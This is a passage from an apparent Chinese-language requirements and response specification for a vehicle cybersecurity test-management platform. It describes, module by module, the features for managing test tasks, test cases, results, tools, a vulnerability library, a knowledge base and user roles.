动化或半自动化实现测试时，平台支持简洁合理的引导测试功能作为补充。用户可以根据指导进行测试，并记录测试结果和评估。</p><ol><li>三方测试接入功能</li></ol><p>平台支持灵活的三方测试接入功能，用户可以根据测试模块协议自定义适配三方测试工具，并将其集成到平台中。这使得用户可以根据需求选择合适的三方测试工具，并与平台进行无缝集成。</p><p>通过我们的测试场景功能，用户可以根据不同维度进行全面的安全测试，包括硬件安全、数据安全、系统安全、软件安全和协议安全等。平台提供了自动化、半自动化和引导测试等多种方式，以满足用户的不同测试需求，并支持灵活的三方测试工具接入。这将帮助用户全面评估汽车系统的安全性和合规性，发现潜在的漏洞和安全问题，并采取相应的措施进行修复和改进。</p><h2 id="功能布局"><a href="#功能布局" class="headerlink" title="功能布局"></a>功能布局</h2><h3 id="主页展示功能布局"><a href="#主页展示功能布局" class="headerlink" title="主页展示功能布局"></a>主页展示功能布局</h3><p>功能参响应如下：</p><ol><li>包含可视化大屏入口，平台统计入口，车型测试管理入口，用例管理入口，知识库入口。</li><li>功能快捷入口包含新增样品、新增任务、新增用例、导出报告、系统状态等。</li><li>可视化大屏显示，包含车型、零部件漏洞排行，当前测试任务进度完成情况等信息 。</li><li>统计数据展示内容包含数量统计：已录入样品、已创建任务、已拥有用例、已测试结果、已挂载工具的总数；零部件样品类型排行；任务测试情况等。</li><li>展示内容支持选择可见性。</li><li>车型测试管理入口进入车型测试流程。</li><li>车型测试管理入口支持测试系统框架结构展示。</li><li>在测试人员进入车型测试管理入口后，支持主界面显示我的测试任务相关统计（正在执行，未执行，已完成等），支持测试任务完成后可以编辑测试时间及测试结果并提交测试报告。</li><li>根据权限对测试统计内容、执行状态、项目状态等统计展示不同的信息。</li></ol><p>响应方案：</p><p>多功能入口设计：</p><p>平台设计包括一个集成的界面，提供直观的可视化大屏入口，以便用户可以快速访问关键数据和信息。此外，还有专门的平台统计入口用于数据分析，车型测试管理入口用于协调和监控测试活动，用例管理入口用于组织和维护测试用例，以及知识库入口，方便用户访问技术文档和学习资源。</p><p>功能快捷入口：</p><p>平台提供一系列快捷入口，以提高用户效率和操作便捷性。这些包括新增样品、新增任务、新增用例、导出报告和查看系统状态等功能。这些快捷操作允许用户快速开始新的工作或查看当前系统的运行状况。</p><p>可视化大屏显示：</p><p>大屏幕显示功能提供了一个直观的仪表板，展示了车型和零部件漏洞的排行榜，以及当前测试任务的进度和完成情况。这有助于用户一目了然地把握关键的安全和测试信息。</p><p>统计数据展示内容：</p><p>数据统计展示功能包括各种关键指标的数量统计，如已录入的样品、已创建的任务、已拥有的用例、已完成的测试结果以及已挂载的工具总数。此外，还有零部件样品类型排行和任务测试情况的统计数据，帮助用户理解测试覆盖范围和质量。</p><p>可选内容可见性：</p><p>平台支持自定义展示内容的可见性，允许用户根据自己的需要和偏好选择要显示的数据和信息，从而优化用户体验和信息获取效率。</p><p>车型测试管理流程：</p><p>车型测试管理入口引导用户进入车型测试流程，这个流程是标准化的，确保所有测试工作都能按照既定的步骤和标准进行。</p><p>测试系统框架结构展示：</p><p>通过车型测试管理入口，用户可以查看测试系统的框架结构，这有助于用户理解测试环境的构建和各组件之间的关系。</p><p>我的测试任务统计与报告：</p><p>测试人员进入车型测试管理入口后，主界面会显示“我的测试任务”相关的统计信息，包括正在执行的、未执行的和已完成的任务。完成测试任务后，用户可以编辑测试时间和结果，并提交测试报告。</p><p>权限相关的统计信息展示：</p><p>平台根据用户的权限显示不同的测试统计内容、执行状态和项目状态。这确保了信息的安全性和个性化展示，同时也符合数据访问控制的最佳实践。</p><h3 id="车型管理功能布局"><a href="#车型管理功能布局" class="headerlink" title="车型管理功能布局"></a>车型管理功能布局</h3><p>功能参响应如下：</p><ol><li>车型管理：*车型名称、*类型、描述、项目名称、SOP节点、费用号、测试接口人、总线拓扑结构等信息。</li><li>测试项管理：内置控制器管理，供所有车型测试项选用，每个车型下配置计划测试的控制器的测试项，*测试对象（控制器、整车等）、*测试方向（比如：单件合规测试、渗透测试、IDS入侵测试）、*所在网络（比如：CAN、CANFD、ETH）*测试执行（选择用户）、测试轮次[轮次名称、开始时间、结束时间]。</li><li>支持新增、删除、修改车型信息。</li><li>车型创建、测试项配置、需要对应权限才能操作。</li></ol><p>响应方案：</p><p>车型管理功能详细描述：</p><p>车型管理是平台中用于维护和管理车辆型号信息的核心功能。用户可以在这里录入和查看车型的详细信息，包括：</p><p>车型名称：车辆型号的唯一标识。</p><p>类型：车辆的分类，如轿车、SUV、卡车等。</p><p>描述：对车型的详细描述，包括设计理念、特点等。</p><p>项目名称：车型关联的项目或测试计划的名称。</p><p>SOP节点：车型在标准操作流程（Standard Operating Procedure）中的具体阶段。</p><p>费用号：与车型相关的成本中心或费用账户。</p><p>测试接口人：负责该车型测试的主要联系人。</p><p>总线拓扑结构：车型的电子设备和网络布局，包括CAN总线和其他通信接口。</p><p>测试项管理功能详细描述：</p><p>测试项管理允许用户配置和管理不同车型的测试计划和控制器。功能包括：</p><p>内置控制器管理：一个集中库，存储所有可用于测试的控制器信息。</p><p>测试项配置：为每个车型配置计划内的测试控制器和相关测试项。</p><p>测试对象：指定测试的目标，例如控制器或整车。</p><p>测试方向：定义测试的类型，如单件合规性测试、渗透测试、IDS入侵测试等。</p><p>所在网络：指定控制器所在的网络类型，如CAN、CANFD、ETH等。</p><p>测试执行：分配负责执行测试的用户。</p><p>测试轮次：每轮测试的详细信息，包括轮次名称、开始时间和结束时间。</p><p>车型信息的维护：</p><p>平台提供了新增、删除和修改车型信息的功能，使用户能够根据项目的进展和需求更新车型数据。</p><p>权限管理：</p><p>创建车型和配置测试项需要相应的权限。这意味着只有被授权的用户才能进行这些操作，从而确保了平台数据的完整性和安全性。权限管理机制保护了敏感信息不被未授权访问，并确保了操作的合规性。</p><h3 id="计划管理功能布局"><a href="#计划管理功能布局" class="headerlink" title="计划管理功能布局"></a>计划管理功能布局</h3><p>功能参响应如下：</p><ol><li>支持按照权限设置不同的时间计划：测试接口人可制定车型对应的测试项的测试时间，测试执行人员可查看车型的测试项和规划时间，制定自己的测试时间，提交审批。审批后不可修改。</li><li>支持测试进度展示：显示不同被测对象不同测试阶段的实际测试情况是否与计划相一致。根据用户权限显示统计数据。</li><li>支持显示计划内任务测试执行次数，支持显示统计图：计划时间内、延期状态，统计计划内任务执行次数。根据用户权限显示统计数据。</li><li>测试计划指定支持扁平化，按照横向时间跨度展示，直观显示计划在年、月、周上的跨度，计划测试时间横向排布，按照测试项纵向排布。</li><li>测试计划支持设置测试轮次，制定轮次时间、测试项等信息。</li><li>测试时间计划制定后支持测试项、测试任务、测试进度等统计，直观显示计划进展，完成度，相关人员与测试次数等信息，测试人员显示自己的测试内容，测试接口人具备查看该车型的所有统计信息和实验室负责人具备查看所有车型的统计信息。</li></ol><p>响应方案：</p><p>权限设置与时间计划管理：</p><p>平台支持基于角色的时间计划管理，确保不同权限的用户能够执行特定的操作：</p><p>测试接口人：负责制定每个车型对应的测试项的测试时间计划。</p><p>测试执行人员：能够查看车型的测试项和规划时间，并根据这些信息制定自己的测试时间计划，然后提交审批。</p><p>一旦测试时间计划被审批，便不能再进行修改，以确保测试流程的一致性和稳定性。</p><p>测试进度展示：</p><p>测试进度展示功能能够实时显示不同被测对象在不同测试阶段的实际测试情况，并与原计划进行对比。</p><p>用户能够根据其权限查看相应的统计数据，确保信息的透明性同时保护敏感数据。</p><p>任务执行次数和统计图表：</p><p>平台提供了对计划内任务的测试执行次数进行展示的功能，以及显示计划时间内和延期状态的统计图。</p><p>用户可以查看计划内任务的执行次数，并通过统计图直观地理解项目的进度和状态。</p><p>展示的统计数据会根据用户的权限进行调整，保障数据安全和个性化需求。</p><p>测试计划的时间跨度展示：</p><p>测试计划在界面上支持扁平化展示，即按照横向时间跨度展示，使用户可以直观地看到计划在年、月、周等时间单位上的分布。</p><p>测试时间计划横向排布，而测试项则纵向排布，以便用户能够清晰地理解测试计划的结构和时间线。</p><p>测试轮次设置：</p><p>用户可以为测试计划设置不同的测试轮次，并为每个轮次指定时间和测试项等信息。</p><p>这有助于将大型测试计划分解为更小、更易于管理的部分，同时也便于跟踪每个阶段的进度。</p><p>测试时间计划与统计信息：</p><p>一旦测试时间计划被制定，平台支持对测试项、测试任务、测试进度等进行统计，直观显示计划进展和完成度。</p><p>测试人员可以看到分配给自己的测试内容，测试接口人可以查看该车型的所有统计信息，而实验室负责人则能够查看所有车型的统计信息。</p><p>这种信息的层级展示确保了工作的透明度，并允许不同角色的用户根据其职责和需要访问相关数据。</p><h3 id="任务管理功能布局"><a href="#任务管理功能布局" class="headerlink" title="任务管理功能布局"></a>任务管理功能布局</h3><p>功能参响应如下：</p><ol><li>测试执行人员可创建测试样件，管理字段包括：*名称、*所属车型（自动设置）、*生产厂商、版本(版本号作为零部件的一个tag或者分支，可以创建删除修改)、描述、零部件号、样件开发状态、送件人、送件时间、软硬件版本及最终样件去向等信息。</li><li>可对测试样件直接创建测试任务，可在任务管理内创建测试任务关联样件。</li><li>测试执行人员可创建自己的测试任务，选择测试项，测试对象（自行创建测试样件/整车）。支持提交任务完成，完成后不可再执行。测试完成后可进行回归，回归可编辑选择新的测试样件。测试执行时间自动记录开始时间，测试提交完成时自动记录完成时间并在计划内增加测试次数。</li><li>回归测试任务自动选择原测试任务未通过的测试用例，并支持更改。（新增或者取消）</li><li>测试任务支持上传测试内容计划，支持测试内容审批功能，通过审批的测试内容，按计划中内容进行测试。</li><li>支持任务多任务、多场景并行执行。支持多用户执行测试时，工具资源占用显示等待队列和当前执行任务状态等信息。支持后台执行测试，切换、关闭界面不影响测试执行，重新打开页面继续显示当前测试进度。</li><li>测试任务状态实时展示，包括不限于正在执行、执行完毕、等待中。</li><li>自动化任务自动执行，预先配置选择的测试用例相关参数，自动生成测试结果、生成关联漏洞、测试报告。</li><li>支持任务回归，不覆盖原任务测试结果和测试报告。对回归通过的测试项关联的漏洞缺陷进行关闭，更新状态为测试通过。</li><li>支持回归的任务默认勾选上一次任务的FAIL 项用例，支持fail项的步骤附录在测试报告中。</li><li>非自动化测试任务，对添加的人工测试用例，支持按照用例步骤上传图片、测试描述、测试结果选择等信息。</li><li>支持对漏洞进行CVSS3.0评分，只需按照符合项选项勾选，自动计算得分、出具漏洞评级并显示在测试报告中。</li><li>对测试任务支持查看测试结果，测试结果详情：自定义测试步骤预览、自动化测试用例执行结果和选择信息。</li><li>支持选择测试用例执行。</li><li>调用自动化工具的测试任务，支持自动化测试，支持统一配置参数窗口，测试用例执行过程中全自动化。</li><li>支持任务参数存储，每次执行支持对参数修改、参数值清空等功能。</li><li>对测试任务支持选择报告模板，查看测试报告，测试报告下载功能。</li><li>测试任务支持打包下载测试内容计划、测试用例、测试log、测试报告等文件。</li><li>所提供的测试任务管理界面，支持查看相应测试任务信息，包括当前测试状态、测试结果等。</li><li>任务支持选择测试项后自动关联相关的测试用例，并展示。</li><li>任务执行支持：测试用例选择、选中的测试用例参数配置、测试执行实时展示用例执行状态：比如用例的执行进度和结果等。</li><li>任务执行完成，支持展示测试结果，下载报告、log、测试用例（包含步骤）测试计划内容等文件包。</li><li>支持创建手动测试任务（比如硬件测试：按照定义用例步骤上传图片）选择自定义用例执行时根据用例步骤上传执行过程图片、log等，并支持生成测试报告，并下载。</li></ol><p>响应方案：</p><p>测试样件管理：</p><p>测试执行人员可以创建和管理测试样件，这包括以下字段：</p><p>名称：测试样件的唯一识别名。</p><p>所属车型：自动与创建样件时选定的车型关联。</p><p>生产厂商：制造测试样件的公司。</p><p>版本：样件的版本号，作为区分不同样件的标签或分支，可创建、删除或修改。</p><p>描述：对测试样件的详细描述。</p><p>零部件号：测试样件的部件编号。</p><p>样件开发状态：标识样件是否处于开发、测试或完成状态。</p><p>送件人：交付测试样件的人员。</p><p>送件时间：样件交付的具体时间。</p><p>软硬件版本：样件所使用的软硬件版本信息。</p><p>最终样件去向：样件测试完成后的去向。</p><p>创建测试任务与样件关联：</p><p>可以直接为测试样件创建相关的测试任务，也可以在任务管理模块内创建测试任务并关联到特定样件。</p><p>测试任务的创建与执行：</p><p>测试执行人员可以创建自己的测试任务，选择测试项和测试对象（自行创建的测试样件或整车）。</p><p>支持任务完成提交，一旦提交后，该任务不可再执行。</p><p>对于完成的测试任务，可以进行回归测试，回归时可以选择新的测试样件。</p><p>测试任务的开始时间和完成时间自动记录，并在计划内增加测试次数。</p><p>回归测试任务：</p><p>回归测试会自动选择原测试任务中未通过的测试用例，并允许用户进行更改（新增或取消）。</p><p>测试内容计划与审批：</p><p>测试任务支持上传测试内容计划，并提供审批功能。通过审批的测试内容将按计划执行。</p><p>任务并行执行与资源管理：</p><p>支持多任务、多场景并行执行，并在多用户执行测试时显示工具资源的占用、等待队列和当前任务的执行状态。</p><p>支持后台执行测试，切换或关闭界面不会影响测试的执行，重新打开页面可以继续显示当前的测试进度。</p><p>测试任务状态实时展示：</p><p>实时展示测试任务的状态，如正在执行、执行完毕、等待中等。</p><p>自动化任务执行：</p><p>自动化任务会自动执行预先配置的测试用例，并自动生成测试结果、关联漏洞和测试报告。</p><p>任务回归与结果管理：</p><p>支持任务回归，不会覆盖原任务的测试结果和报告。对于回归通过的测试项，相关的漏洞缺陷会被关闭，并更新状态为测试通过。</p><p>回归任务的用例选择：</p><p>回归任务默认勾选上一次任务的FAIL项用例，并在测试报告中附录fail项的步骤。</p><p>非自动化测试任务的管理：</p><p>对于人工测试用例，支持按照用例步骤上传图片、测试描述、测试结果选择等信息。</p><p>漏洞评分：</p><p>支持使用CVSS3.0进行漏洞评分，用户通过勾选符合项即可自动计算得分，并在测试报告中显示漏洞评级。</p><p>查看测试结果：</p><p>支持查看测试任务的结果，详情包括自定义测试步骤预览、自动化测试用例的执行结果和选择信息。</p><p>测试用例执行选择：</p><p>支持用户选择特定的测试用例进行执行。</p><p>调用自动化工具的测试任务：</p><p>支持自动化测试，并提供统一的配置参数窗口，全自动化执行测试用例。</p><p>任务参数存储与管理：</p><p>每次执行任务时支持对参数进行修改或清空。</p><p>测试报告模板选择与查看：</p><p>支持选择报告模板，查看和下载测试报告。</p><p>测试任务文件打包下载：</p><p>支持打包下载测试内容计划、测试用例、测试log、测试报告等文件。</p><p>测试任务管理界面：</p><p>提供一个界面用于查看测试任务的相关信息，包括当前测试状态、测试结果等。</p><p>测试项与用例关联：</p><p>任务创建时支持自动关联相关的测试用例，并进行展示。</p><p>任务执行支持：</p><p>支持测试用例的选择和参数配置，实时展示用例的执行状态，如执行进度和结果。</p><p>任务执行完成后的管理：</p><p>完成任务后，支持展示测试结果，下载报告、log、测试用例和测试计划内容等文件包。</p><p>手动测试任务创建与报告生成：</p><p>支持创建手动测试任务，并在执行时上传执行过程的图片、log等。完成后，支持生成和下载测试报告。</p><h3 id="用例管理功能布局"><a href="#用例管理功能布局" class="headerlink" title="用例管理功能布局"></a>用例管理功能布局</h3><p>功能参响应如下：</p><ol><li>支持测试用例自定义编写、分类查询、添加、删除、修改等功能。</li><li>支持测试用例进行编号管理，方便自动化测试脚本开发及测试执行调用。</li><li>支持关联测试项，并按照测试项分类。</li><li>测试用例显示、层级功能清晰，布局合理，操作流畅。</li><li>测试用例统一管理，可按类型、测试方向等条件筛选，显示审批状态和引用次数等统计信息。</li><li>支持测试用例步骤编写以及能在结果中结果展示。分为自动化测试用例（调用工具）和手动添加测试用例。</li><li>支持为指定的待测试设备或者测试方向，应用特定的测试用例，极大程度增加实际操作情景的便利性。</li><li>定制的测试用例具有编写、试用、发布等状态。支持审核功能，提交到实验室负责人角色进行审核，审核后即可更新到关联模块中。</li><li>测试用例编写支持关联需求文档，需求类别、编号等。执行该用例的测试任务可查看关联的需求文档，和需求编号等信息。</li><li>支持上传用例模板，支持按照模板格式下载测试用例。</li></ol><p>响应方案：</p><p>测试用例自定义编写与管理：</p><p>平台应支持测试用例的自定义编写，提供灵活的编辑器来编写和修改测试用例。</p><p>用户可以通过分类查询功能快速找到特定的测试用例，并进行添加、删除或修改操作。</p><p>测试用例编号管理：</p><p>每个测试用例都应有一个唯一的编号，以便于自动化测试脚本的开发和测试执行时的调用。</p><p>编号管理还有助于保持测试用例库的有序性和可追溯性。</p><p>测试用例与测试项关联：</p><p>测试用例应能够与相关的测试项关联，并按照测试项进行分类，以便于管理和执行。</p><p>测试用例的显示与层级管理：</p><p>测试用例在界面上的显示应清晰、层级分明，且布局合理。</p><p>用户在操作时应感到流畅，无需进行繁琐的页面跳转。</p><p>测试用例统一管理：</p><p>用户应能够根据类型、测试方向等条件筛选测试用例。</p><p>平台显示测试用例的审批状态和被引用次数等统计信息，以便用户了解每个用例的使用情况。</p><p>测试用例步骤编写与结果展示：</p><p>支持用户编写测试用例的具体步骤，并在测试结果中清晰展示这些步骤。</p><p>应区分自动化测试用例（调用工具执行）和手动添加的测试用例。</p><p>测试用例的应用性：</p><p>用户可以为指定的待测试设备或测试方向应用特定的测试用例，以提高测试的便利性和实际操作的相关性。</p><p>测试用例的状态与审核：</p><p>定制的测试用例应具有编写、试用、发布等状态。</p><p>平台支持审核功能，可以提交到实验室负责人进行审核，审核通过后，测试用例即可更新到关联的模块中。</p><p>测试用例与需求文档关联：</p><p>测试用例编写时支持关联需求文档，如需求类别、编号等。</p><p>执行测试用例的任务可以查看到关联的需求文档和需求编号等信息。</p><p>测试用例模板上传与下载：</p><p>平台支持上传测试用例模板，以便用户能够按照一定的格式编写和下载测试用例。</p><p>这有助于标准化测试用例的格式，确保测试的一致性和高效性。</p><h3 id="结果管理功能布局"><a href="#结果管理功能布局" class="headerlink" title="结果管理功能布局"></a>结果管理功能布局</h3><p>功能参响应如下：</p><ol><li>支持测试完成后，将此次测试结果进行统计，包括通过项、失败项及跳过项数量；</li><li>支持对于一个车型的测试结果进行统计，包括测试控制器、测试轮数、测试问题数等，可以看出哪些控制器进行了测试，哪些问题较多，哪些问题重复出现的较多等；</li><li>支持导出文件中，例如EXCEL格式等，方便离线统计车型测试结果；</li><li>支持对测试过程中存储的CAN测试数据、以太网测试数据、终端系统测试数据等实现统一管理；</li><li>支持测试数据与相应测试用例名称进行一一对应，方便快速找到测试问题项数据；</li><li>支持测试数据存于服务器端也可存于客户端，若存于服务器端可通过测试管理软件下载到本地；</li><li>支持上传测试报告模板；</li><li>测试报告格式为Excel或word版本格式；</li><li>测试报告支持自动化生成，可在测试管理软件中下载查看；</li><li>具备测试报告中的图片清晰、易懂，且便于问题分析；</li><li>测试报告中支持各个测试内容对应相应的测试数据，具备将问题发生的时间或者数据截图放到报告中，方便问题跟踪分析；</li><li>测试中间数据，包含测试操作日志，收发报文等可通过平台一并导出；</li><li>测试任务结果分为总体结果，每次迭代的结果。</li></ol><p>响应方案：</p><p>测试结果统计：</p><p>平台应提供功能以统计每次测试的结果，包括通过项、失败项及跳过项的数量。</p><p>这将帮助用户快速了解测试的概况和关注点。</p><p>车型测试结果综合统计：</p><p>应支持对单个车型的综合测试结果进行统计，包括测试的控制器数量、测试轮次、发现的问题数量等。</p><p>统计数据应能揭示哪些控制器被频繁测试、哪些问题经常出现，以及哪些问题是重复的。</p><p>测试结果导出：</p><p>用户应能将测试结果导出为EXCEL等格式的文件，以便于进行离线分析和记录。</p><p>测试数据统一管理：</p><p>平台应支持CAN测试数据、以太网测试数据、终端系统测试数据等的统一管理。</p><p>这有助于保持数据的有序性和可访问性。</p><p>测试数据与测试用例对应：</p><p>测试数据应与相应的测试用例名称一一对应，以便用户能快速定位测试中的问题项。</p><p>测试数据存储位置：</p><p>测试数据既可以存储在服务器端，也可以存储在客户端。</p><p>若存储在服务器端，用户应能通过测试管理软件下载数据到本地。</p><p>上传测试报告模板：</p><p>平台应支持上传自定义的测试报告模板，以便生成符合用户需求的测试报告。</p><p>测试报告格式：</p><p>测试报告应支持Excel或Word格式，以适应不同用户的需求。</p><p>自动化生成测试报告：</p><p>测试报告应支持自动化生成，并能在测试管理软件中下载和查看。</p><p>测试报告的质量：</p><p>报告中的图片应清晰、易懂，并且便于问题分析。</p><p>测试报告内容详细：</p><p>测试报告应包含各个测试内容对应的测试数据，并能将问题发生的时间或数据截图整合到报告中，方便后续的问题跟踪和分析。</p><p>中间测试数据导出：</p><p>用户应能通过平台导出包括测试操作日志、收发报文等中间测试数据。</p><p>测试任务结果分类：</p><p>测试任务结果应分为总体结果和每次迭代的结果，以便用户了解每个阶段的测试情况。</p><h3 id="工具管理功能布局"><a href="#工具管理功能布局" class="headerlink" title="工具管理功能布局"></a>工具管理功能布局</h3><p>功能参数如下：</p><ol><li>对系统内所有的工具进行管理和展示，包括已接入和未接入的工具以及工具的版本和描述；</li><li>已接入且启动的工具状态为在线，未启动的工具状态为离线</li><li>支持工具添加和连接配置；</li><li>离线状态下的工具状态显示在任务中，对应任务提示不可执行；</li><li>支持查看、配置工具接入权限，工具使用记录，工具占用状态展示；</li><li>支持查看工具说明书、调用API等信息；</li><li>支持使用状态、记录统计功能。</li></ol><p>响应方案：</p><p>工具管理与展示：</p><p>系统应提供一个界面，用于展示所有工具的列表，包括已接入的工具和未接入的工具。</p><p>每个工具旁边应显示其版本信息和描述，以便用户能够快速了解工具的功能和适用场景。</p><p>工具状态管理：</p><p>工具的状态应明确标识为“在线”或“离线”。</p><p>“在线”状态表示工具已经接入并启动，可以正常使用。</p><p>“离线”状态表示工具未启动，不可用于当前测试任务。</p><p>工具添加与配置：</p><p>用户应能轻松添加新工具，并通过平台进行连接配置。</p><p>这可能包括指定IP地址、端口号、认证信息等，以确保工具能够成功接入系统。</p><p>任务中的工具状态提示：</p><p>如果某个任务需要使用的工具处于离线状态，任务状态应显示这一信息，并提示用户该任务当前不可执行。</p><p>工具权限和使用记录管理：</p><p>平台应支持查看和配置工具的接入权限，以确保只有授权用户可以使用特定工具。</p><p>工具的使用记录应被记录和展示，包括谁使用了工具、使用时间和持续时间等。</p><p>工具的占用状态也应实时展示，以避免资源冲突。</p><p>工具文档和API信息：</p><p>用户应能够查看每个工具的说明书和调用API的相关信息。</p><p>这将帮助用户了解如何正确使用工具，并能够在必要时进行故障排除。</p><p>使用状态和记录统计：</p><p>系统应提供工具的使用状态和记录的统计功能。</p><p>这将包括工具的使用频率、使用时长、使用效率等统计数据，以便于管理和优化工具的使用。</p><h3 id="知识库管理功能布局"><a href="#知识库管理功能布局" class="headerlink" title="知识库管理功能布局"></a>知识库管理功能布局</h3><p>功能参响应如下：</p><ol><li>知识库管理包括对入侵检测与防御测试系统资料文件进行统一管理，资料文件范围包括系统整体介绍，各软件使用说明等文档，支持的操作包括上传、下载、删除；</li><li>支持针对漏洞利用方法进行知识累积，支持编辑文本，文本内添加图片等功能；</li><li>支持自定义文件目录结构。</li></ol><p>响应方案：</p><p>知识库管理：</p><p>系统应提供一个知识库管理模块，用于存储和管理入侵检测与防御测试系统的相关资料文件。</p><p>资料文件的范围应包括但不限于系统整体介绍、各软件使用说明书等文档。</p><p>用户应能够执行上传、下载和删除文件的操作。</p><p>知识库应有权限管理功能，确保只有授权用户才能上传和删除文件，而所有用户都可以下载文件。</p><p>漏洞利用方法知识累积：</p><p>系统应允许用户针对特定的漏洞利用方法编写和累积知识。</p><p>编辑器应支持文本编辑，并允许用户在文本中插入图片、表格等多媒体元素。</p><p>这些记录应方便用户查阅，以提供关于如何识别和防御特定漏洞的指南。</p><p>自定义文件目录结构：</p><p>用户应能够自定义知识库的文件目录结构，以适应不同的组织需求。</p><p>这包括创建文件夹、子文件夹，以及对文件和文件夹进行命名，以保持知识库的有序性。</p><p>文件目录结构应支持拖放操作，以便用户能够轻松地管理和重新组织文件。</p><h3 id="漏洞管理功能布局"><a href="#漏洞管理功能布局" class="headerlink" title="漏洞管理功能布局"></a>漏洞管理功能布局</h3><p>功能参响应如下：</p><ol><li>漏洞库显示测试的漏洞库信息，内容至少包括漏洞的CVE编号、CNNVD编号、漏洞名称、影响版本、影响模块、漏洞等级；</li><li>漏洞等级支持按等级进行升降排序；</li><li>支持对漏洞的编号/名称的模糊查询、漏洞等级查询等，漏洞库信息需定期向漏洞扫描工具进行获取；</li><li>提供漏洞平台调用接口；</li><li>车型漏洞库显示测试的缺陷信息，包括发现日期、缺陷描述、关联车型、零部件，支持按等级进行升降排序；</li><li>车型缺陷管理数据来源支持平台测试的缺陷和导入excel缺陷信息两种方式，均支持数据手动删除，通过平台自己产生的数据可通过回归测试自动删除；</li><li>支持漏洞利用编辑文本录入导入知识库。</li></ol><p>响应方案：</p><p>漏洞库信息展示：</p><p>漏洞库应展示关键信息，包括但不限于：</p><p>CVE编号：漏洞的通用漏洞编号，为国际公认的标准化漏洞管理数据格式。</p><p>CNNVD编号：中国国家信息安全漏洞库编号。</p><p>漏洞名称：对漏洞的简短描述或命名。</p><p>影响版本：受漏洞影响的软件或硬件版本。</p><p>影响模块：受影响的系统或软件模块。</p><p>漏洞等级：漏洞的严重性等级，可以是高、中、低等级别。</p><p>漏洞等级排序：</p><p>漏洞库应支持按照漏洞等级进行升序或降序排序，以便用户可以根据严重性快速定位漏洞。</p><p>漏洞查询功能：</p><p>用户应能够进行模糊查询，如通过漏洞编号或名称搜索相关漏洞。</p><p>应支持根据漏洞等级进行查询。</p><p>漏洞库信息需定期更新，系统应能从漏洞扫描工具获取最新的漏洞数据。</p><p>漏洞平台调用接口：</p><p>系统应提供API接口，以便其他系统或工具可以查询漏洞库或利用漏洞信息。</p><p>车型漏洞库展示：</p><p>车型漏洞库应展示与测试相关的缺陷信息，包括：</p><p>发现日期：缺陷被发现的日期。</p><p>缺陷描述：缺陷的详细说明。</p><p>关联车型：受缺陷影响的车型。</p><p>零部件：缺陷相关的零部件信息。</p><p>支持按照缺陷等级进行排序。</p><p>车型缺陷管理：</p><p>数据来源应支持通过平台测试发现的缺陷和导入Excel格式的缺陷信息两种方式。</p><p>用户应能够手动删除缺陷数据。</p><p>通过平台自动生成的数据可在回归测试后自动删除。</p><p>漏洞利用知识库编辑与导入：</p><p>用户应能够编辑漏洞利用方法的文本，并将这些信息导入知识库。</p><p>编辑器应支持文本格式化功能，如添加图片、链接等，以丰富知识库内容。</p><h3 id="系统管理功能布局"><a href="#系统管理功能布局" class="headerlink" title="系统管理功能布局"></a>系统管理功能布局</h3><p>功能参响应如下：</p><ol><li>支持用户管理、角色管理，权限管理，审批管理，审计管理等 ；</li><li>支持预置5种角色权限，支持自定义角色（实验室负责人/测试接口人/测试执行人/三方服务人员/审计人员）；</li><li>提供根据工作邮箱注册、注册审核功能，并邮件通知；</li><li>实验室负责人创建测试车型，添加该车型测试专业接口人，生成该车型对应审核列表，按照类别显示待审核（包括不限于测试时间计划，测试内容计划、测试用例发布等）内容。可进行管理操作，包括不限于：按条件查询，通过审批，查看详情，驳回等功能。支持查看测试人员测试状态与进展，整体测试状态与进展；</li><li>测试专业接口人收到车型测试任务（支持邮件通知），支持制定三级测试时间整体计划，支持设定测试人员、测试项、测试控制器、具体测试时间计划等。支持上传测试规范文件和相关需求文件，开启相关用户获取权限，支持向测试人员发送邮件通知。支持向上级提交测试时间计划审批。支持查看测试人员测试状态与进展，整体测试状态与进展；</li><li>测试人员收到测试控制器的具体测试项的测试任务，支持可修改该项的测试时间计划，支持确认测试计划并通知上级审批。审批后的计划时间不可修改。支持测试任务执行。支持创建测试任务关联三方服务人员；</li><li>三方服务人员只能进入到车型测试入口，进行测试相关工作；</li><li>用户支持修改、重置自己用户登录密码，密码密文传出 ；</li><li>系统升级显示系统升级的历史记录（版本号、状态、升级类型、更新时间、升级内容）。系统升级的内容需放置在升级包中，升级过程中读取本次升级内容并记录显示；</li><li>审批功能支持自定义审批节点模板功能，并支持应用在不同模块的审批流程中；</li><li>审批支持向相关用户发送电子邮件；</li><li>支持平台审计功能，审计操作日志：登录、制定计划、创建任务、执行任务、编写漏洞信息、回归测试执行等，用户工作过程留下的日志记录（日志类型可根据甲方需求进行定制），并支持多维度筛选条件按查看日志比如：时间，执行任务、选择车型、选择测试人等查看日志，并生成审计记录。</li></ol><p>响应方案：</p><p>综合用户与权限管理：</p><p>平台应提供全面的用户管理功能，包括用户账号创建、角色分配、权限设置、审批流程管理，以及审计日志记录。</p><p>用户管理模块应能够处理用户的注册、登录、权限验证、密码管理等功能。</p><p>角色权限预置与自定义：</p><p>平台预置五种角色权限：实验室负责人、测试接口人、测试执行人、三方服务人员、审计人员。</p><p>支持自定义角色和权限设置，以适应不同组织结构和工作流程的需要。</p><p>注册审核与邮件通知：</p><p>用户可以通过工作邮箱进行注册，注册信息需经过审核才能激活账号。</p><p>审核通过后，系统自动发送邮件通知用户。</p><p>实验室负责人的管理职能：</p><p>实验室负责人负责创建测试车型，指定测试专业接口人，并生成审核列表。</p><p>负责人可以按类别管理待审核内容，并执行查询、审批、查看详情、驳回等操作。</p><p>实验室负责人还能查看测试人员和整体测试的状态与进展。</p><p>测试专业接口人的职责：</p><p>测试专业接口人在收到车型测试任务后，负责制定测试时间计划，设定测试人员和测试项等。</p><p>能够上传测试规范和需求文件，并开放给相关用户访问权限。</p><p>可向上级提交测试时间计划审批，并查看测试进展。</p><p>测试执行人的工作流程：</p><p>测试执行人收到具体测试任务后，可以制定或修改测试时间计划，并提交审批。</p><p>审批通过后，测试计划时间固定不变，执行人负责执行测试任务。</p><p>测试执行人可以创建与三方服务人员相关联的测试任务。</p><p>三方服务人员的界面权限：</p><p>三方服务人员的界面权限应被限制仅到车型测试入口，专注于执行测试相关工作。</p><p>用户密码管理：</p><p>用户应能修改和重置自己的登录密码，密码以密文形式传输以确保安全。</p><p>系统升级管理：</p><p>系统应记录每次升级的详细信息，包括版本号、状态、升级类型、更新时间和升级内容。</p><p>升级内容应存放在升级包中，升级过程中系统自动读取并记录本次升级的详细内容。</p><p>自定义审批节点模板：</p><p>支持自定义审批节点模板功能，并可将模板应用于不同的审批流程。</p><p>审批邮件通知：</p><p>审批过程中，系统应支